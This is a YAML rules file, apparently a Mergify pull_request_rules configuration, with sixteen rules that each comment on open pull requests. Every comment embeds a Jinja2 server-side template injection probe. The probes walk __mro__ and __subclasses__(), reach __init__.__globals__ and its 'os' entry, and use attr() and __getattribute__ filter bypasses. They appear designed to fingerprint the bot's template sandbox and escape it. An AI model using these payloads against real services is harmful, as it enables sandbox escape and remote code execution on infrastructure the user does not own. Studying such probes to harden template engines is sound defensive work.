pull_request_rules:
  - name: B1
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B1=[
          {{ author.__class__.__mro__ }}
          ]
  - name: B2
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B2=[
          {{ author.__class__.__base__.__subclasses__() }}
          ]
  - name: B3
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B3=[
          {{ author|attr("__class__")|attr("__mro__") }}
          ]
  - name: B4
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B4=[
          {{ self.__init__.__globals__ }}
          ]
  - name: B5
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B5=[
          {{ author.__init__.__globals__["os"] }}
          ]
  - name: B6
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B6=[
          {{ ""["__class__"] }}
          ]
  - name: B7
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B7=[
          {{ author.__class__.__base__.__subclasses__()[0] }}
          ]
  - name: B8
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B8=[
          {{ author.format }}
          ]
  - name: B9
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B9=[
          {{ author|attr("format") }}
          ]
  - name: B10
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B10=[
          {{ author.__getattribute__("__class__") }}
          ]
  - name: B11
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B11=[
          {{ author|join }}
          ]
  - name: B12
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B12=[
          {{ author|safe }}
          ]
  - name: B13
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B13=[
          {{ author|tojson }}
          ]
  - name: B14
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B14=[
          {{ author|map("upper")|list }}
          ]
  - name: B15
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B15=[
          {{ [author]|sort(attribute="__class__") }}
          ]
  - name: B16
    conditions:
      - -closed
    actions:
      comment:
        message: |
          B16=[
          {{ author|select("string")|list }}
          ]
